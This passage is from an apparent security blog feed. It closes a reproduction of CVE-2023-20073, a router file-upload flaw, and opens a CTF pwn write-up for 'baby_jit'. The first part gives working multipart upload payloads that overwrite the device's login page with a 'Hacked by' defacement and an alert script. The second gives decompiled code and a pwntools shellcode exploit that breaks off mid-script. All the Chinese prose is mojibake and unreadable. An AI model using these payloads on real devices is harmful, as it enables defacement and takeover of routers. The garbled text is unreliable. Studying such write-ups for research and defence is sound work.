class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;what&quot;;filename=&quot;login.html&quot;;Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Apple Style Ad<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: -apple-system, BlinkMacSystemFont, <span class="string">&quot;Segoe UI&quot;</span>, Roboto, <span class="string">&quot;Helvetica Neue&quot;</span>, Arial, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#f5f5f7</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ad-container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">4px</span> <span class="number">12px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ad-image</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">max-width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ad-title</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">2em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0</span> <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ad-description</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">1.2em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#666</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ad-button</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#0071e3</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">6px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ad-button</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#005bb5</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ad-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;your-image.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Product Image&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ad-image&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ad-title&quot;</span>&gt;</span>Hacked by s1nec-1o!!!!!!!!!!!!!!!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ad-description&quot;</span>&gt;</span>welcome to iot world !!!!!!!!!!!!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://s1nec-1o.github.io/&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ad-button&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331166.png" alt="image-20240811231158839"></p><h2 id="Poc2"><a href="#Poc2" class="headerlink" title="Poc2"></a>Poc2</h2><p>winmtå¸ˆå‚…è¿˜æœ‰ä¸€ç§Pocå¯ä»¥æ›´åŠ çš„ä¼˜é›…æ¥æ§åˆ¶file.pathï¼Œå…¶å®æŠ¥æ–‡ä¼šæ ¹æ®é…ç½®æ–‡ä»¶æ¥è‡ªåŠ¨æ¥æ·»åŠ ä¸€ä¸ª <code>xxx.path</code></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331167.png" alt="image-20240811232236329"></p><blockquote><ul><li>$upload_field_name  åŸå§‹çš„æ–‡ä»¶å­—æ®µ</li><li>$upload_content_type ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</li><li>$upload_file_name å®¢æˆ·ç«¯ä¸Šä¼ çš„åŸå§‹æ–‡ä»¶åç§°</li><li>$upload_tmp_path ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åœ¨æœåŠ¡ç«¯çš„ä½ç½®</li></ul></blockquote><p>å› æ­¤ä¼šæŠŠåŸå§‹å­—æ®µçš„åç§°å…ˆèµ‹æˆä¸Šä¼ æ–‡ä»¶çš„åç§°ï¼Œç„¶åä¸Šä¼ æ–‡ä»¶çš„åç§°.pathå°±ä¼šè®°å½•åœ¨ä¸Šä¼ çš„ä½ç½®ï¼Œå³&#x2F;tmp&#x2F;upload&#x2F;0000000001ï¼Œå› æ­¤å¯ä»¥ç”¨æ›´ä¼˜é›…çš„æ–¹å¼è¿›è¡Œåˆ©ç”¨</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;pathparam&quot;</span><br><span class="line"></span><br><span class="line">Portal</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileparam&quot;</span><br><span class="line"></span><br><span class="line">login.html</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;;filename=&quot;login.html&quot;;Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>The website has been hacked!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;The website has been hacked&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">------------</span><br></pre></td></tr></table></figure><h1 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h1><p>è¿™ç®—æ˜¯ç¬¬äºŒæ¬¡å¤ç°äº†ï¼Œç¬¬ä¸€æ¬¡äº†äº†æ”¶åœºï¼Œè¿˜æœ‰å¥½å¤šä¸œè¥¿æ²¡ææ‡‚ï¼Œè¿™æ¬¡ä¸€æ¬¡æ€§ç»™ä»–å¼„æ‡‚äº†ï¼Œæƒ³æ¥ä¸€æ­¥ä¸€æ­¥åšä¸‹æ¥ï¼ŒIoTå°ç™½(æˆ‘)ä¹Ÿæ˜¯èƒ½æ”¶è·æ»¡æ»¡çš„</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://zikh26.github.io/posts/848296ab.html">ZIKH26</a></p><p><a href="https://blog.csdn.net/zzhongcy/article/details/88863037">https://blog.csdn.net/zzhongcy/article/details/88863037</a></p><p><a href="https://www.cnblogs.com/54chensongxia/p/12938929.html">https://www.cnblogs.com/54chensongxia/p/12938929.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2023-20073&quot;&gt;&lt;a href=&quot;#CVE-2023-20073&quot; class=&quot;headerlink&quot; title=&quot;CVE-2023-20073&quot;&gt;&lt;/a&gt;CVE-2023-20073&lt;/h1&gt;&lt;h1 id=&quot;æå–å›ºä»¶&quot;&gt;&lt;a href=&quot;#æ</summary>
      
    
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´å¤ç°" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOTå®‰å…¨" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>2024ciscnåä¸œå—pwn</title>
    <link href="http://s1nec-1o.github.io/2024/08/07/2024ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97pwn/"/>
    <id>http://s1nec-1o.github.io/2024/08/07/2024ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97pwn/</id>
    <published>2024-08-07T02:21:24.000Z</published>
    <updated>2024-08-07T02:44:03.927Z</updated>
    
    <content type="html"><![CDATA[<p>æ¯”èµ›çš„æ—¶å€™å…¨é fixå¾—åˆ†ï¼Œä¹Ÿæ˜¯å‚ä¸ä¸Šäº†</p><h1 id="baby-jit"><a href="#baby-jit" class="headerlink" title="baby_jit"></a>baby_jit</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  heap = <span class="built_in">malloc</span>(<span class="number">8LL</span> * (count + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">sandbox</span>();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;1. Add\n2. Exec\n3. Exit\n&gt;&gt; &quot;</span>);</span><br><span class="line">      <span class="built_in">fgets</span>(s, <span class="number">8</span>, stdin);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s, <span class="string">&quot;1\n&quot;</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">add</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s, <span class="string">&quot;2\n&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye &quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exec</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯ä¸€ä¸ªæ²™ç›’ï¼Œç„¶åæœ‰ä¸¤ä¸ªåŠŸèƒ½ä¸€ä¸ªExecå’Œä¸€ä¸ªAddå‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">fgets</span>((<span class="type">char</span> *)s, <span class="number">0x30</span>, stdin);</span><br><span class="line">  *((_QWORD *)heap + count++) = s;</span><br><span class="line">  dest = <span class="built_in">malloc</span>(<span class="number">8LL</span> * (count + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, heap, <span class="number">8LL</span> * count);</span><br><span class="line">  <span class="built_in">free</span>(heap);</span><br><span class="line">  result = dest;</span><br><span class="line">  heap = dest;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;                                               <span class="comment">// å°±æ˜¯ä¿æŒæœ‰ä¸€ä¸ªå †å—æ°å¥½èƒ½è£…ä¸‹æ‰€æœ‰chunk_sçš„åœ°å€</span></span><br></pre></td></tr></table></figure><p>addå°±æ˜¯ä¸€ç›´ä¿æŒæœ‰ä¸€ä¸ªå †å—åˆšå¥½å­˜äº†æ‰€æœ‰çš„å †å—çš„åœ°å€ï¼Œæ¯ä¸ªheap_séƒ½æœ‰ä¸€ä¸ª0x30çš„å†…å®¹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">int</span> offset; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> *endptr; <span class="comment">// [rsp+18h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;offset?&quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">8</span>, stdin);</span><br><span class="line">  offset = (<span class="type">int</span>)(<span class="built_in">atof</span>(s) * <span class="number">12.0</span>);</span><br><span class="line">  v3 = <span class="number">12</span> * count + <span class="number">4</span>;</span><br><span class="line">  v6 = (<span class="type">char</span> *)<span class="built_in">mmap</span>((<span class="type">void</span> *)<span class="number">0x100000</span>, <span class="number">12</span> * count + <span class="number">20</span>, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  v6[v3 - <span class="number">4</span>] = <span class="number">0x48</span>;</span><br><span class="line">  v6[v3 - <span class="number">3</span>] = <span class="number">0x89</span>;</span><br><span class="line">  v6[v3 - <span class="number">2</span>] = <span class="number">0xD8</span>;</span><br><span class="line">  v6[v3 - <span class="number">1</span>] = <span class="number">0xC3</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; count; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    s1 = (<span class="type">char</span> *)*((_QWORD *)heap + i);</span><br><span class="line">    *v6 = <span class="number">0x48</span>;</span><br><span class="line">    v6[<span class="number">1</span>] = <span class="number">0xB8</span>;</span><br><span class="line">    v5 = <span class="built_in">strtoull</span>(s1 + <span class="number">4</span>, &amp;endptr, <span class="number">10</span>);</span><br><span class="line">    *(_QWORD *)(v6 + <span class="number">2</span>) = v5;</span><br><span class="line">    v6 += <span class="number">10</span>;</span><br><span class="line">    *v6 = <span class="number">0x48</span>;</span><br><span class="line">    v6[<span class="number">2</span>] = <span class="number">-61</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;add&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;sub&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6[<span class="number">1</span>] = <span class="number">0x29</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;xor&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6[<span class="number">1</span>] = <span class="number">0x31</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;and&quot;</span>, <span class="number">3uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6[<span class="number">1</span>] = <span class="number">0x21</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 += <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = ((__int64 (*)(<span class="type">void</span>))(offset + <span class="number">0x100000</span>))();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;result = %llu\n&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">munmap</span>((<span class="type">void</span> *)<span class="number">0x100000</span>, v3);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä¼šè®°å½•ä¸€ä¸ªoffsetï¼Œè¯¥offsetå¯ä»¥ä¸ºå°æ•°ï¼Œä¹‹åå–æ•´æ•°éƒ¨åˆ†ï¼Œä¹‹åçš„åˆ¤æ–­addå’Œsubé‚£äº›ä¸»è¦æ˜¯è¦å †å—çš„å†…å®¹ä¸ºâ€add deadbeefâ€ä¹‹ç±»çš„ä¼šå°†addæ”¹ä¸ºå¯¹åº”çš„æœºå™¨ç ï¼Œä¹‹åä¼šæ‰§è¡Œ0x100000+offsetä¸Šçš„å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000015B</span>0 <span class="number">48</span> <span class="number">31</span> DB                      <span class="keyword">xor</span>     rbx, rbx</span><br><span class="line">.text:<span class="number">00000000000015B</span>3 <span class="number">8B</span> <span class="number">45</span> C0                      mov     eax, [rbp+offset]</span><br><span class="line">.text:<span class="number">00000000000015B</span>6 <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">10</span> <span class="number">00</span>                add     eax, <span class="number">100000</span>h</span><br><span class="line">.text:<span class="number">00000000000015B</span>B <span class="number">48</span> <span class="number">98</span>                         cdqe</span><br><span class="line">.text:<span class="number">00000000000015B</span>D <span class="number">48</span> <span class="number">89</span> C2                      mov     rdx, rax</span><br><span class="line">.text:<span class="number">00000000000015</span>C0 B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000015</span>C5 FF D2                         call    rdx</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¥æ‰§è¡Œç”¨call rdxæ¥æ‰§è¡Œï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬åªç”¨ç®€çŸ­çš„ä¸€è¡ŒæŒ‡ä»¤è¿›è¡Œread(0,rdx,nbytes)ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†ä¹‹åçš„æœºå™¨ç è¦†ç›–ä¸ºæˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿ï¼Œè¿™é“é¢˜æ„Ÿè§‰æˆ‘ä¹‹å‰é‡åˆ°è¿‡ä¸€ä¸ªç±»ä¼¼çš„æ€è·¯ä¹Ÿæ˜¯ç”¨readæ¥æ‰§è¡Œæœºå™¨ç ï¼Œä¸»è¦æ˜¯é€†å‘çš„é—®é¢˜ï¼Œæˆ‘åœ¨æ¯”èµ›çš„æ—¶å€™æ²¡æœ‰ææ‡‚addå’Œsubé‚£äº›åˆ¤æ–­çš„ä½œç”¨ï¼Œä¸€ç›´å¡åœ¨é‚£é‡Œï¼Œä½†æ˜¯å…¶å®è¿™äº›éƒ½æ˜¯æ²¡ç”¨çš„ï¼ï¼ï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">FILENAME=<span class="string">&#x27;./baby_jit&#x27;</span></span><br><span class="line">p= process(FILENAME)</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">script = <span class="number">0</span></span>):</span><br><span class="line"><span class="keyword">if</span>(script):</span><br><span class="line">gdb.attach(p, script)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">context</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(context)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exec</span>(<span class="params">context</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;offset&#x27;</span>)</span><br><span class="line">    p.sendline(context)</span><br><span class="line"></span><br><span class="line">calc_sh= <span class="built_in">str</span>(u64(<span class="string">b&#x27;\x00\x90\x50\x5f\x52\x5e\x0f\x05&#x27;</span>)) </span><br><span class="line"><span class="string">&#x27;&#x27;</span></span><br><span class="line">sh=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">push   rax</span></span><br><span class="line"><span class="string">pop    rdi</span></span><br><span 